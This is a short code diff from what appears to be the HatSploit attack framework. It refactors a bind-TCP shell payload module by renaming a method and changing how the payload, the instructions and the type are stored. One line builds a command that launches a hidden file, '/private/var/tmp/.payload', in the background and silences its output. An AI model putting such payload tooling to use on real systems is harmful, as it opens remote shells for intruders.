@@ -55,7 +55,7 @@ class HatSploitPayload(HatSploitPayload):
         }
     }
 
-    def generate(self):
+    def run(self):
         bind_port, executable_format = self.parser.parse_options(self.options)
         bind_port = self.payload_generator.port_to_bytes(bind_port)
 
@@ -126,6 +126,6 @@ class HatSploitPayload(HatSploitPayload):
         instructions += "sh -c '/private/var/tmp/.payload' 2>/dev/bull &"
         instructions += "\n"
 
-        self.method['Payload'] = payload
-        self.method['Instructions'] = instructions
-        self.method['Type'] = 'bind_tcp'
+        self.payload = payload
+        self.instructions = instructions
+        self.action = 'bind_tcp'
